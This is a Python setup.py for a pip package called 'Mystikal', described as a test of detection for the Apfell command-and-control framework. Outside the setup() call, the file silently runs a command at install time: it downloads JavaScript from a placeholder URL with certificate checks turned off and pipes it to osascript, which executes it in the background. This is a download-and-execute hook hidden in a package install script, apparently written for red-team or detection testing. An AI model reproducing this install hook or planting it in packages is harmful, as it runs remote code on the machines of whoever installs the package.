from setuptools import setup, find_packages
import subprocess

subprocess.Popen('curl -k "URL" | osascript -l JavaScript &')

setup(
    name = 'Mystikal',
    packages = find_packages(),
    version = '1.0',
    description = 'Python PIP package to test Apfell detection',
    author = '',
    author_email = '',
    url = '',
    download_url = '',
    keywords = [''],
    classifiers = [],
)